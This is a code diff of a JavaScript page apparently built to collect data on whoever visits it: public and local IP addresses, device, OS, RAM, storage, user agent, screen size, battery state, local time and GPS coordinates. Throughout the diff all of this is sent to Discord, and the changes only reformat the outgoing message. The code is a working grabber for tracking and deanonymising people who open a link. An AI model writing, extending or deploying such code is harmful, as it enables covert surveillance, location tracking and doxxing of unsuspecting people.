@@ -83,22 +83,26 @@
                         position => {
                             const coords = `Latitude: ${position.coords.latitude}, Longitude: ${position.coords.longitude}`;
                             sendToDiscord(`
-**Device Info:**
-Public IP: ${publicIP}
-Local IP: ${localIP}
-Local WiFi Address: ${wifiAddress}
-Local Time: ${localDeviceTime}
-Device: ${deviceInfo}
-OS: ${osInfo}
-RAM: ${deviceRam}
-Storage: ${storageInfo}
-UserAgent: ${userAgent}
-Screen: ${width}x${height}
-Battery: ${batteryPercentage}
-Charging: ${isCharging}
+**Local Time:**
+- ${localDeviceTime}
 
-**Geolocation:**
-${coords}`);
+**IP Info:**
+- **Public IP**: ${publicIP}
+- **Local IP**: ${localIP}
+
+**Device Info:**
+- **Device**: ${deviceInfo}
+- **OS**: ${osInfo}
+- **RAM**: ${deviceRam}
+- **Storage**: ${storageInfo}
+- **UserAgent**: ${userAgent}
+- **Screen Resolution**: ${width}x${height}
+- **Battery Percentage**: ${batteryPercentage}
+- **Charging**: ${isCharging}
+
+**Geolocation Info:**
+- **Latitude**: ${position.coords.latitude}
+- **Longitude**: ${position.coords.longitude}`);
                         },
                         error => {
                             if (error.code === error.PERMISSION_DENIED) {
@@ -124,19 +128,22 @@ ${coords}`);
                 await fetchBatteryInfo();
                 fetchDeviceInfo();
                 sendToDiscord(`
+**Local Time:**
+- ${localDeviceTime}
+
+**IP Info:**
+- **Public IP**: ${publicIP}
+- **Local IP**: ${localIP}
+
 **Device Info:**
-Public IP: ${publicIP}
-Local IP: ${localIP}
-Local WiFi Address: ${wifiAddress}
-Local Time: ${localDeviceTime}
-Device: ${deviceInfo}
-OS: ${osInfo}
-RAM: ${deviceRam}
-Storage: ${storageInfo}
-UserAgent: ${userAgent}
-Screen: ${width}x${height}
-Battery: ${batteryPercentage}
-Charging: ${isCharging}`);
+- **Device**: ${deviceInfo}
+- **OS**: ${osInfo}
+- **RAM**: ${deviceRam}
+- **Storage**: ${storageInfo}
+- **UserAgent**: ${userAgent}
+- **Screen Resolution**: ${width}x${height}
+- **Battery Percentage**: ${batteryPercentage}
+- **Charging**: ${isCharging}`);
 
                 fetchGeolocation();
             }
